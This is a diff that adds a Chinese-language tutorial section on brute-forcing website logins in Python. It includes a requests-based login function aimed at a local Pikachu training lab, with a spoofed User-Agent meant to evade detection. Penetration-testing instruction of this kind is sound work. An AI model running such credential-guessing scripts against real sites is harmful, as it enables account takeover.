@@ -429,9 +429,50 @@ fw.start()
 
 
 
+## 使用py对网站进行爆破
+
+### 前言
+
+> 对网站进行爆破的基础是线程池以及文件操作，使用open操作把字典从系统中打开可以节省大量的代码空间以及美观，其次是使用多线程来提高提升效率
+
+为什么不使用 `Burpsuite` 进行爆破，不是更方便吗？还不用写工具。在实际的网站渗透中时常会遇见一些安全意识较高的厂商
+
+他们会对数据包中加入一些 `session` 随后在其中加入时间戳这个关键数据。再使用js加密后生成的一串不起眼的数字。从而导致一个数据包只能用一次，无法反复利用。在 `Burpsuite` 的重放模块就会直接显示不可重放等。从而隔绝了通过固定的一个数据包导致的爆破。
 
 
 
+```python
+import requests				# 导入请求模块
+
+
+def login_bp(user, pwd):	# 创建一个函数用于处理登录请求
+    url = 'http://192.168.245.151/pikachu/vul/burteforce/bf_form.php'		# 登录请求接口
+    header = {
+        'Content-Type': 'application/x-www-form-urlencoded',	# 请求头代表这是一次post传参
+        'User-Agent': 'Mozilla / 5.0(Windows NT 10.0;Win64;x64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 118.0.0.0Safari / 537.36Edg / 118.0.2088.76'		   # 请求头，加上当前的浏览器数据防止被检测
+    }
+
+    proxy = {
+        'http': 'http://127.0.0.1:8080',			# 挂上bp代理监听，查看数据包的情况
+        'https': 'http://127.0.0.1:8080'
+    }
+
+    data = {					# 请求主题，包含了账号密码以及提交3个参数
+        'username': user,		# josn的数据类型格式键值对，右边的是可变的变量代表我们将要爆破的参数
+        'password': pwd,
+        'submit': 'Login'
+    }
+
+    res = requests.post(url=url, headers=header, data=data, proxies=proxy, verify=False)	
+    #最后开始请求，以post的方式请求，跟上以上参数，verify的意思是忽略证书问题
+    if 'success' in res.text:		# 检测是否爆破成功，爆破成功之后返回的数据包里会包含success这个字符串
+        print(user, '->', pwd)		# 判断当前存在这个字符串则自动输出最终爆破成功的账号密码
+        exit(0)
+
+login_bp('admin', '123456')			# 函数实参传递，为后续的爆破以及多线程做铺垫
+```
+
+以上代码可以进行一次简单的账号密码登录请求，def函数里的就是爆破模块，现在要在外面写上线程以及导入我们的账号密码
 
 
 
